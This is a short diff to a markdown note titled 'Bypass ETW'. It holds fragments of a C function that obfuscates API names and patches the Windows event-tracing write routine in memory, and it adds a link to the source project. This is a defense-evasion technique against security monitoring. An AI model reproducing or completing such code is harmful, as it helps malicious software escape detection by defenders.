@@ -1,7 +1,6 @@
 ## Bypass ETW
 
 ```C
-#include "Evasion.h"
 
 int DisableETW(void) {
 	unsigned char strVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0x0 };
@@ -30,4 +29,6 @@ int DisableETW(void) {
 	pFlushInstructionCache(-1, pEventWrite, 4096);
 	return 0;
 }
+
+// https://github.com/Allevon412/BreadBear/blob/4f1f5da39b423f0655df9338e01c8b733c6d1152/stage1/Evasion.c
 ```
